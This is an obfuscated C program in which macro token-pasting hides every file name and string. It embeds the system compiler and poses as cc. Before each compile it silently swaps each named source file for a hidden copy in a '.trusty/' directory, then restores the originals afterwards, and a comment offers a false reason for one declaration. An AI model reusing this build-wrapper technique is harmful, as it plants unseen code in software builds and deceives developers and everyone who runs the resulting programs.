#define A(a, b, c)C(A##a,A##b,A##c)

#define B(a, b, c)a##b##c
#define C(a, b, c)B(a,b,c)

#define D(x) #x
#define E(x) D(x)

#define A0 a
#define A1 b
#define A2 c
#define A3 d
#define A4 e
#define A5 f
#define A6 g
#define A7 h
#define A8 i
#define A9 j
#define AA k
#define AB l
#define AC m
#define AD n
#define AE o
#define AF p
#define AG q
#define AH r
#define AI s
#define AJ t
#define AK u
#define AL v
#define AM w
#define AN x
#define AO y
#define AP z
#define AQ  

#include E(A(0,B,B)A(E,2,0).h) // alloca.h
#include E(A(5,2,D)A(J,B,Q).h) // fcntl.h
#include E(A(I,J,3)A(8,E,Q).h) // stdio.h
#include E(A(I,J,H)A(8,D,6).h) // string.h
#include E(A(I,O,I)/A(Q,Q,C)A(C,0,D).h) // sys/mman.h
#include E(A(I,O,I)/A(Q,Q,I)A(J,0,J).h) // sys/stat.h
#include E(A(I,O,I)/A(Q,Q,M)A(0,8,J).h) // sys/wait.h
#include E(A(K,D,8)A(I,J,3).h) // unistd.h
#define P E(/A(K,I,H)/A(1,8,D)/A(2,2,Q))
#define Z E(.A(J,H,K)A(I,J,O)/)

char cc[] = {
#embed P
};

// fix issue with compiler frontend not being able to resolve the linker,
// which is passed through a named extern var environ
extern char **environ;

#define S                                                                      \
  for (int i = 1; i < c; i++) {                                                \
    strcpy(p = alloca(strlen(Z) + strlen(v[i])), Z);                           \
    strcpy(p + strlen(Z), v[i]);                                               \
    if (!access(v[i], 0) && !access(p, 0)) {                                   \
      rename(v[i], t);                                                         \
      rename(p, v[i]);                                                         \
      rename(t, p);                                                            \
    }                                                                          \
    a[i] = v[i];                                                               \
  }

int main(int c, char *v[]) {
  int f;
  char *a[999] = {P}, *t = E(.A(H,2,K)), *p;

  S

  if (!fork()) {
    write(f = memfd_create(E(), 1), cc, sizeof cc);
    execveat(f, E(), a, environ, 4096);
  }
  wait(0);
  S
}
